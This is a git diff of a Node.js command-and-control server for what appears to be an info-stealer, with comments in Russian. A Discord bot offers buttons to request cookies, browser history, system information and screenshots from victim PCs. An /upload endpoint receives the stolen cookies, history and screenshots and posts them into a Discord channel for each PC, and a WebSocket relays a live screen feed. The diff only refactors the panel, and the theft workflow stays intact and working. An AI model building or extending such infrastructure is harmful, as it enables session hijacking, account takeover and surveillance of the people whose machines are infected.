@@ -4,7 +4,6 @@ import { WebSocketServer } from "ws";
 import http from "http";
 import { fileURLToPath } from "url";
 import { dirname, join } from "path";
-import crypto from "crypto";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
@@ -19,18 +18,10 @@ const CATEGORY_NAME = "Все ПК";
 const ONLINE_TIMEOUT = 3 * 60 * 1000;
 
 // ---------- Состояние ----------
-const onlinePCs = {};          // pcId -> timestamp
-const pendingCommands = {};    // pcId -> array команд
-const channelByPC = {};        // pcId -> channelId
-const wsCameraClients = {};    // pcId -> массив WS клиентов для live-камеры
-const pcIdMap = {};            // shortId -> реальный pcId
-
-// ---------- Утилита ----------
-function makeShortId(pcId) {
-    const shortId = crypto.createHash("sha1").update(pcId).digest("hex").slice(0, 10);
-    pcIdMap[shortId] = pcId;
-    return shortId;
-}
+const onlinePCs = {};           // pcId -> timestamp
+const pendingCommands = {};     // pcId -> array of commands
+const channelByPC = {};         // pcId -> channelId
+const wsCameraClients = {};     // pcId -> array of ws для live-камеры
 
 // ---------- Discord Bot ----------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
@@ -38,43 +29,21 @@ bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag
 
 // ---------- Кнопки ----------
 function createControlButtons(pcId) {
-    const shortId = makeShortId(pcId);
+    const safePcId = encodeURIComponent(pcId);
     return [new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId(`check_online|${shortId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
-        new ButtonBuilder().setCustomId(`get_cookies|${shortId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId(`get_history|${shortId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId(`get_system|${shortId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
-        new ButtonBuilder().setCustomId(`get_screenshot|${shortId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
+        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
+        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
     )];
-}
-
-async function sendControlButtons(pcId) {
-    try {
-        const guild = await bot.guilds.fetch(GUILD_ID);
-        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
-        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
-        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
-        channelByPC[pcId] = finalChannel.id;
-
-        await finalChannel.send({
-            content: `Управление ПК: ${pcId}`,
-            components: createControlButtons(pcId)
-        });
-    } catch(err) {
-        console.error("Ошибка отправки кнопок:", err);
-    }
 }
 
 // ---------- Обработка кнопок ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
-    const [command, shortId] = interaction.customId.split("|");
-    const pcId = pcIdMap[shortId];
-    if(!pcId) {
-        await interaction.reply({ content: "❌ Неизвестный PC ID", ephemeral: true });
-        return;
-    }
-
+    const [command, encodedPcId] = interaction.customId.split("|");
+    const pcId = decodeURIComponent(encodedPcId);
     const lastPing = onlinePCs[pcId];
     const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
 
@@ -112,13 +81,12 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------- Приём обычных данных (куки, история, скриншоты) ----------
+// ---------- Приём данных ----------
 app.post("/upload", async (req, res) => {
     try {
         const { pcId, cookies, history, systemInfo, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
 
-        const isNewPC = !onlinePCs[pcId];
         onlinePCs[pcId] = Date.now();
 
         const guild = await bot.guilds.fetch(GUILD_ID);
@@ -127,6 +95,7 @@ app.post("/upload", async (req, res) => {
         const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
         channelByPC[pcId] = finalChannel.id;
 
+        // ---------- Отправка файлов ----------
         const files = [];
         if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
         if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
@@ -135,22 +104,8 @@ app.post("/upload", async (req, res) => {
 
         if(files.length) await finalChannel.send({ files });
 
-        if(isNewPC) await sendControlButtons(pcId);
-
-        res.json({ success:true });
-    } catch(err){
-        console.error(err);
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// ---------- Приём данных с камеры (только WS, Discord не трогаем) ----------
-app.post("/upload-cam", async (req, res) => {
-    try {
-        const { pcId, screenshot } = req.body;
-        if(!pcId || !screenshot) return res.status(400).json({ error:"pcId и screenshot required" });
-
-        if(wsCameraClients[pcId]){
+        // ---------- Live камера ----------
+        if(screenshot && wsCameraClients[pcId]){
             wsCameraClients[pcId].forEach(ws => {
                 try { ws.send(screenshot); } catch(e){ }
             });
@@ -184,7 +139,7 @@ app.use(express.static(join(__dirname,"public")));
 // ---------- WebSocket для live камеры ----------
 const wss = new WebSocketServer({ noServer: true });
 wss.on("connection", (ws, req)=>{
-    const url = new URL(req.url, `http://${req.headers.host}`);
+    const url = new URL(req.url, `https://${req.headers.host}`);
     const pcId = url.searchParams.get("pcId");
     if(!pcId) return ws.close();
 
